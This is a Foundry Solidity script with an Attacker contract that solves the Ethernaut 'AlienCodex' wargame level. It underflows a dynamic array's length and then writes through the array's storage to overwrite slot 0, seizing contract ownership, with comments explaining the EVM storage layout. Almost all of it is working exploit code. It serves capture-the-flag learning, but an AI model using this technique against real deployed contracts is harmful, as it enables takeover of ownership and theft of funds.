// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

interface AlienCodex {
    function contact() external view returns(bool);
    function codex() external view returns(bytes32[] memory);
    function makeContact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract Attacker {
    AlienCodex target;
    constructor(address _target) {
        target = AlienCodex(_target);
        // bypass modifier
        target.makeContact(); 
        // cause underflow, solidity v < 0.8. Array length is now max uint256
        target.retract(); 

        // keccak256 accepts only bytes32, that's why we need to convert uint256(1) to bytes with abi.encode(uint256(1))
        // calculate the slot where the first element from codex[] is stored
        uint256 k = uint256(keccak256(abi.encode(uint256(1))));  

        uint256 i;

        // unchecked because the Attacker contract is implemented with solidity v > 0.8.0
        unchecked {
            // calculate the zeroth slot
            i = i - k;
        }
        target.revise(i, bytes32(uint256(uint160(msg.sender))));
    }
}

contract AlienCodexScript is Script {

    /**
     * Solution: Must know prerequisites are 
     * 1. What is underflow
     * 2. How dynamic arrays are stored in the EVM
     * 3. Keep in mind the contract is implemeted with Solidity version 0.5.0
     * 
     * The owner is stored at the 0th slot, because the contract is Ownable and the first far from Ownable is _owner
     * You can easily check the 0th sloth with cast storage.
     * 
     * 0th slot - 0x0000000000000000000000000bc04aa6aac163a6b3667636d798fa053d43bd11
     * Owner is 20 bytes addres - 0x0bc04aa6aac163a6b3667636d798fa053d43bd11
     * 
     * bool contact is 1 byte and it's stored also on the 0th slot
     * 1st slot contains the length of the dynamic array codex[]
     * All the elementes of the codex[] are stored starting from the keccak(1) slot. 
     * 
     * Resources: 
     * https://dev.to/ceasermikes002/understanding-how-the-evm-stores-mappings-arrays-and-structs-in-solidity-5adh
     * https://medium.com/coinmonks/learn-solidity-lesson-22-type-casting-656d164b9991
     */
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attacker attacker = new Attacker(0xeA56fb8A927c78Fe02F3a99AAEdb8f42cceFA79b);
        vm.stopBroadcast();
    }
}